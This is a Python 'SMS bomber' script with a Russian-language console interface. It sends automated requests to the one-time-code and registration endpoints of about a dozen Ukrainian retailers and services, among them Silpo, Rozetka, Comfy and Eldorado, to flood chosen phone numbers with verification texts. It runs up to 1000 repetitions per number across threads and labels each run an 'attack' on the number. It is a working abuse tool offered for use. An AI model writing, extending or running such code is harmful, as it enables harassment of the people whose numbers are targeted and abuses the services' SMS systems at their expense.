import os
import requests
from rich.console import Console
from rich.progress import track
from time import sleep
from threading import Thread
from concurrent.futures import ThreadPoolExecutor, as_completed

console = Console()
running = True

os.system('cls' if os.name == 'nt' else 'clear')

# Define SMS sending functions for various services
def send_silpo_sms(phone_number):
    url = "https://auth.silpo.ua/api/v1/Login/ByPhone"
    payload = {
        "phone": f"+{phone_number}",
        "recaptcha": None,
        "delivery_method": "sms",
        "phoneChannelType": 0,
        "email": "eldakniga@gmail.com"
    }
    params = {
        "returnUrl": "https://auth.silpo.ua/connect/authorize/callback?client_id=silpo--site--spa&redirect_uri=https%3A%2F%2Fsilpo.ua%2Fsignin-callback-angular.html&response_type=code&scope=public-my%20openid&nonce=c12ffb23b120d9f5e988c5553417b10461INOWXm6&state=09a4cebddef19cb62efea068f7614da391XeCaq1h&code_challenge=IjuZe-feoKqxCvefNnvFnLMNGXtUQjzRCnI2sVdhwGY&code_challenge_method=S256"
    }
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(url, json=payload, params=params, headers=headers)
        if response.status_code == 200:
            return "Silpo: Сообщение отправлено успешно"
        else:
            return f"Silpo: Ошибка отправки\nСтатус код: {response.status_code}\nОтвет сервера: {response.text}"
    except requests.RequestException as e:
        return f'Silpo: Ошибка отправки\nОшибка: {e}'

def send_brocard_sms(phone_number):
    url = "https://www.brocard.ua/graphql"
    payload = {
        "operationName": "validateCustomerRegistration",
        "query": """
            mutation validateCustomerRegistration($input: CustomerCreateInput!) {
                validationInfo: validateAndSendSmsCustomerRegistration(input: $input) {
                    status
                    error
                    error_type
                    __typename
                }
            }
        """,
        "variables": {
            "input": {
                "firstname": "по",
                "phone": f"+{phone_number}",
                "is_send_sms": True
            }
        }
    }
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            return "Brocard: Сообщение отправлено успешно"
        else:
            return f"Brocard: Ошибка отправки\nСтатус код: {response.status_code}\nОтвет сервера: {response.text}"
    except requests.RequestException as e:
        return f'Brocard: Ошибка отправки\nОшибка: {e}'

def send_klo_sms(phone_number):
    url = "https://fcs.klo.ua/smart-cards-api/common/users/otp"
    params = {
        "lang": "uk",
        "phone": phone_number
    }

    try:
        response = requests.get(url, params=params)
        if response.status_code == 200:
            return "Klo: Сообщение отправлено успешно"
        else:
            return f"Klo: Ошибка отправки\nСтатус код: {response.status_code}\nОтвет сервера: {response.text}"
    except requests.RequestException as e:
        return f'Klo: Ошибка отправки\nОшибка: {e}'

def send_ucb_sms(phone_number):
    url = "https://ucb.l.podorozhnyk.com/api/send/otp"
    payload = {
        "phone": phone_number
    }
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            return "UCB: Сообщение отправлено успешно"
        else:
            return f"UCB: Ошибка отправки\nСтатус код: {response.status_code}\nОтвет сервера: {response.text}"
    except requests.RequestException as e:
        return f'UCB: Ошибка отправки\nОшибка: {e}'

def send_varus_sms(phone_number):
    url = "https://varus.ua/api/ext/uas/auth/send-otp"
    params = {
        "storeCode": "ua"
    }
    payload = {
        "phone": phone_number
    }
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(url, json=payload, params=params, headers=headers)
        if response.status_code == 200:
            return "Varus: Сообщение отправлено успешно"
        else:
            return f"Varus: Ошибка отправки\nСтатус код: {response.status_code}\nОтвет сервера: {response.text}"
    except requests.RequestException as e:
        return f'Varus: Ошибка отправки\nОшибка: {e}'

def send_comfy_sms(phone_number):
    url = "https://comfy.ua/api/auth/v3/otp/send"
    payload = {
        "phone": phone_number
    }
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            return "Comfy: Сообщение отправлено успешно"
        else:
            return f"Comfy: Ошибка отправки\nСтатус код: {response.status_code}\nОтвет сервера: {response.text}"
    except requests.RequestException as e:
        return f'Comfy: Ошибка отправки\nОшибка: {e}'

def send_eldorado_sms(phone_number):
    phone_number = Cutter(phone_number, 3)  # Обрезаем первые 3 символа
    url = "https://api-users.eldorado.ua/api/auth/phone/signin/"
    params = {
        "lang": "ua"
    }
    payload = {
        "phone": phone_number,
        "step": "user_authorization",
        "guid": "a84c6540-4c23-11ef-bb5a-e12b960acb51"
    }
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(url, json=payload, params=params, headers=headers)
        if response.status_code == 200:
            return "Eldorado: Сообщение отправлено успешно"
        else:
            return f"Eldorado: Ошибка отправки\nСтатус код: {response.status_code}\nОтвет сервера: {response.text}"
    except requests.RequestException as e:
        return f'Eldorado: Ошибка отправки\nОшибка: {e}'

def send_podorozhnyk_sms(phone_number):
    url = "https://ucb.l.podorozhnyk.com/api/send/otp"
    payload = {
        "phone": phone_number
    }
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            return "Podorozhnyk: Сообщение отправлено успешно"
        else:
            return f"Podorozhnyk: Ошибка отправки\nСтатус код: {response.status_code}\nОтвет сервера: {response.text}"
    except requests.RequestException as e:
        return f'Podorozhnyk: Ошибка отправки\nОшибка: {e}'

def send_rozetka_sms(phone_number):
    phone_number = Cutter(phone_number, 2)  # Обрезаем первые 2 символа
    url = "https://uss.rozetka.com.ua/session/auth/phone-code-send-signup"
    payload = {
        "country": "UA",
        "lang": "ru",
        "phone": f"380{phone_number}",
        "accept_terms": True
    }
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            return "Rozetka: Сообщение отправлено успешно"
        else:
            return f"Rozetka: Ошибка отправки\nСтатус код: {response.status_code}\nОтвет сервера: {response.text}"
    except requests.RequestException as e:
        return f'Rozetka: Ошибка отправки\nОшибка: {e}'

def send_multiplex_sms(phone_number):
    phone_number = Cutter(phone_number, 3)  # Обрезаем первые 3 символа
    url = "https://auth2.multiplex.ua/login"
    payload = {
        "login": f"+{phone_number}"
    }
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            return "Multiplex: Сообщение отправлено успешно"
        else:
            return f"Multiplex: Ошибка отправки\nСтатус код: {response.status_code}\nОтвет сервера: {response.text}"
    except requests.RequestException as e:
        return f'Multiplex: Ошибка отправки\nОшибка: {e}'

def send_ctrs_sms(phone_number):
    url = "https://ctrs.ua/api/v1/registration/phone"
    payload = {
        "phone": phone_number
    }
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            return "CTRS: Сообщение отправлено успешно"
        else:
            return f"CTRS: Ошибка отправки\nСтатус код: {response.status_code}\nОтвет сервера: {response.text}"
    except requests.RequestException as e:
        return f'CTRS: Ошибка отправки\nОшибка: {e}'

def send_dnipro_m_sms(phone_number):
    url = "https://dnipro-m.com.ua/api/v1/auth/send-sms"
    payload = {
        "phone": phone_number
    }
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            return "Dnipro-M: Сообщение отправлено успешно"
        else:
            return f"Dnipro-M: Ошибка отправки\nСтатус код: {response.status_code}\nОтвет сервера: {response.text}"
    except requests.RequestException as e:
        return f'Dnipro-M: Ошибка отправки\nОшибка: {e}'

# Function to handle blocking (sending SMS) for each number
def block(number):
    services = [
        send_silpo_sms(number),
        send_brocard_sms(number),
        send_klo_sms(number),
        send_ucb_sms(number),
        send_varus_sms(number),
        send_comfy_sms(number),
        send_eldorado_sms(number),
        send_podorozhnyk_sms(number),
        send_rozetka_sms(number),
        send_multiplex_sms(number),
        send_ctrs_sms(number),
        send_dnipro_m_sms(number)
    ]
    
    # Return the results as a list
    return services

def Cutter(number, num):
    return number[num:]

def Potok(numbers, run, mode):
    numbers = [num.strip() for num in numbers.split(',')]
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for number in numbers:
            for _ in track(range(run), description=f'[blue]Атака на номер {number}...[/blue]'):
                if mode == 'medium':
                    future = executor.submit(block, number)
                    futures.append(future)
                elif mode == 'fast':
                    future = executor.submit(block, number)
                    futures.append(future)
        
        for future in as_completed(futures):
            result = future.result()
            if len(numbers) == 1:
                for res in result:
                    console.print(f'[green]{res}[/green]')
    
    console.print('[green]Атака на все номера началась успешно![/green]')

def run_requests(numbers, run, mode):
    Potok(numbers, run, mode)

def main():
    global running
    console.print('[yellow]/*Shocker*/[/yellow]')

    while running:
        numbers = console.input('[blue]Введите номера телефонов, разделенные запятой: Spavveri>>> ')
        run = int(console.input('[blue]Введите количество повторов (1-1000): Spavveri>>> '))
        mode = console.input('[blue]Выберите режим (medium/fast): Spavveri>>> ').strip().lower()

        request_thread = Thread(target=run_requests, args=(numbers, run, mode))
        request_thread.start()
        request_thread.join()

        console.print('[yellow]Хотите отправить еще раз с теми же параметрами? (yes/no)[/yellow]')
        user_input = console.input('[blue]Spavveri>>> ').strip().lower()
        if user_input == 'no':
            running = False
        else:
            console.print('[yellow]Начинаем с начала...[/yellow]')

if __name__ == "__main__":
    main()
